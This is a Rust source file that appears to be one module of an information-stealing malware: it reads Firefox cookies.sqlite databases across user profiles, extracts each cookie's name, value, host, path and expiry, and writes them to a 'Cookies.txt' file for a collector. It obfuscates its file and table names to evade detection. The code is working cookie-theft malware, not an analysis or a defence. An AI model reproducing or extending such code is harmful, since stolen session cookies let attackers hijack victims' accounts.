use crate::alloc::borrow::ToOwned;
use crate::gecko::GeckoBrowserData;
use crate::{Cookie, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
use alloc::sync::Arc;
use derive_new::new;
use collector::{Browser, Collector};
use database::TableRecord;
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

const MOZ_COOKIES_NAME: usize = 2;
const MOZ_COOKIES_VALUE: usize = 3;
const MOZ_COOKIES_HOST: usize = 4;
const MOZ_COOKIES_PATH: usize = 5;
const MOZ_COOKIES_EXPIRY: usize = 6;

#[derive(new)]
pub(super) struct CookiesTask<'a> {
    browser: Arc<GeckoBrowserData<'a>>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask<'_> {
    parent_name!("Cookies.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(cookies) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
            &self.browser.profiles,
            &StorageFileSystem,
            |profile| profile / s!("cookies.sqlite"),
            s!("moz_cookies"),
            extract_cookies_from_record,
        ) else {
            return;
        };

        collector.get_browser().increase_cookies_by(cookies.len());
        let _ = to_string_and_write_all(&cookies, "\n", filesystem, parent);
    }
}

fn extract_cookies_from_record<R: TableRecord>(record: &R) -> Option<Cookie> {
    let host_key = record.get_value(MOZ_COOKIES_HOST)?.as_string()?;
    let name = record.get_value(MOZ_COOKIES_NAME)?.as_string()?;
    let path = record.get_value(MOZ_COOKIES_PATH)?.as_string()?;
    let expires = record
        .get_value(MOZ_COOKIES_EXPIRY)?
        .as_integer()?;
    let value = record.get_value(MOZ_COOKIES_VALUE)?.as_string()?;

    Some(Cookie {
        host_key,
        name,
        value,
        path,
        expires_utc: expires,
    })
}
